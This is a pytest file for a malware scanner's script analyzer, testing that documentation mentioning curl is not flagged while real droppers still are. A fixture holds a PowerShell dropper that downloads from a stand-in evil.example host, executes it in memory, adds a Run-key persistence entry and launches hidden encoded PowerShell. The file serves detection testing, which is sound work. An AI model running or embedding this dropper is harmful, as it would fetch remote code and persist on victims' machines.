"""A README that explains an attack is not performing one.

`identify.py` classifies any `text/*` as family `script`, so documentation went
through the script analyzer — which looks for `curl`, `wget`, `Invoke-Expression`,
"systemd unit", "Startup folder" and asserts download-and-execute, dynamic
execution and persistence from finding them.

Measured on the corpus, over 59 prose files — every one of them documentation
extracted from a benign archive, ZERO malware:

    24 of 59 rated suspicious or malicious
    rclone README.txt   MALICIOUS  71.4  CIR 8.8
    rclone README.html  MALICIOUS  75.5  CIR 8.8
    rclone.1 (man page) MALICIOUS  77.3  CIR 8.8
    upx.1, NEWS.txt, FAQ.md, CHANGELOG.md, README.md …

The product was rating the manual of a file-copying tool as severe as ransomware,
for explaining how to install it.

This breaks the engine's own stated rule, from `capabilities.py`: "a capability is
something the sample can DO, not something it mentions". The same string means
different things depending on whether the operating system will run the file. In
a `.ps1`, `Invoke-Expression` is the program. In a README it is a sentence.

THREE ENDS HAVE TO HOLD AT ONCE, and this file asserts all three:

    a real script            still malicious   (nothing was blunted)
    a dropper named .txt     still suspicious  ("clean" would be a wrong answer)
    real documentation       clean or low      (no impact claim, no fake family)
"""
from __future__ import annotations

import hashlib

import pytest

from app.engine import identify, scoring, verdict
from app.engine.analyzers import scripts
from app.engine.contracts import IOCs, Sample

#: A working PowerShell dropper: fetch, execute in memory, persist, hide.
DROPPER = (
    b"$ErrorActionPreference='SilentlyContinue'\n"
    b"$c = New-Object Net.WebClient\n"
    b"$c.DownloadFile('http://evil.example/p.exe', \"$env:TEMP\\p.exe\")\n"
    b"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.example/s')\n"
    b"New-ItemProperty -Path HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    b" -Name Upd -Value 'p.exe'\n"
    b"powershell -enc SQBFAFgA -w hidden\n"
)

#: One mention of curl in an install section — what every README on earth has.
README = (
    b"# rclone\n\nrclone syncs files to cloud storage.\n\n"
    b"## Install\n\nOn Linux and macOS, run:\n\n"
    b"    sudo -v ; curl https://rclone.org/install.sh | sudo bash\n\n"
    b"See the manual for details.\n"
)


def _assess(tmp_path, name: str, payload: bytes):
    path = tmp_path / name
    path.write_bytes(payload)
    ident = identify.identify(str(path), name)
    sample = Sample(
        path=str(path), size_bytes=len(payload),
        sha256=hashlib.sha256(payload).hexdigest(),
        md5=hashlib.md5(payload).hexdigest(),
        mime=ident.mime, magic=ident.magic,
        claimed_extension=ident.claimed_extension, original_name=name,
        extension_mismatch=ident.extension_mismatch, family=ident.family,
    )
    result = scripts.analyze(sample)
    risk = scoring.assess([result], ioc_total=result.iocs.total())
    got = verdict.classify(sample.family, sample.mime, [result], result.iocs, risk.final_score)
    return got, risk, result


# --- 1. nothing was blunted --------------------------------------------------


@pytest.mark.parametrize("name", ["dropper.ps1", "dropper.js", "dropper.bat", "dropper.vbs"])
def test_a_real_script_is_still_caught(tmp_path, name) -> None:
    got, risk, result = _assess(tmp_path, name, DROPPER)
    assert got.verdict == "malicious", f"{name} -> {got.verdict} at {risk.final_score}"
    assert {s.id for s in result.signals} >= {
        "script.download_and_execute", "script.dynamic_execution"
    }


# --- 2. a document is not accused of doing what it describes -----------------


@pytest.mark.parametrize(
    "name", ["README.txt", "README.md", "CHANGELOG.md", "rclone.1", "notes.rst", "page.html"]
)
def test_documentation_is_never_malicious(tmp_path, name) -> None:
    got, _risk, _result = _assess(tmp_path, name, README)
    assert got.verdict != "malicious", f"{name} -> {got.to_dict()}"


@pytest.mark.parametrize("name", ["README.txt", "rclone.1", "guide.md"])
def test_documentation_is_not_rated_for_impact(tmp_path, name) -> None:
    """CIR 8.8 said this file could destroy data. It is a text file."""
    from app.engine import impact

    _got, _risk, result = _assess(tmp_path, name, README)
    rating = impact.assess("script", result.signals, result.iocs).to_dict()
    assert rating["base_score"] == 0.0, f"{name} rated {rating['base_score']}"


@pytest.mark.parametrize("name", ["README.txt", "rclone.1"])
def test_a_document_asserts_no_capability(tmp_path, name) -> None:
    from app.engine import capabilities

    _got, _risk, result = _assess(tmp_path, name, README)
    caps = capabilities.detect(result.signals)
    assert not caps, f"{name} was credited with {sorted(caps)}"


def test_the_observation_is_kept_not_deleted(tmp_path) -> None:
    """Suppressing the claim must not suppress the evidence.

    Instructions can be the malicious part of a delivery. An analyst must still
    see that the document describes fetching and running a remote payload.
    """
    _got, _risk, result = _assess(tmp_path, "README.txt", README)
    ids = {s.id for s in result.signals}
    assert "document.mentions_remote_payload" in ids, ids
    assert "script.download_and_execute" not in ids
    note = next(s for s in result.signals if s.id == "document.mentions_remote_payload")
    assert note.severity == "low"
    assert note.evidence.get("original_signal") == "script.download_and_execute"
    assert "not executed by the operating system" in note.detail


# --- 3. and "clean" is not a licence to hide a dropper -----------------------


def test_a_dropper_renamed_txt_is_not_clean(tmp_path) -> None:
    """The other end of the trade. It cannot run as .txt — but a file full of
    working attack code is not something to report as clean."""
    got, _risk, _result = _assess(tmp_path, "instructions.txt", DROPPER)
    assert got.verdict == "suspicious", got.to_dict()


def test_one_mention_does_not_make_a_document_suspicious(tmp_path) -> None:
    """Almost every README mentions curl once. A product where every README is
    "suspicious" has taught its analysts to ignore the word."""
    got, _risk, result = _assess(tmp_path, "README.txt", README)
    notes = {s.id for s in result.signals if s.id.startswith("document.mentions_")}
    assert len(notes) == 1, f"expected a single note, got {notes}"
    assert got.verdict == "clean", got.to_dict()


def test_the_prose_list_contains_no_executable_extension() -> None:
    """A guard on the guard. Adding .ps1 or .js here would silently disarm the
    script analyzer for the files it exists for."""
    executable = {
        ".ps1", ".psm1", ".js", ".jse", ".vbs", ".vbe", ".bat", ".cmd", ".sh",
        ".py", ".pl", ".hta", ".wsf", ".scr", ".exe", ".dll",
    }
    overlap = scripts.PROSE_EXTENSIONS & executable
    assert not overlap, f"executable extensions treated as prose: {sorted(overlap)}"
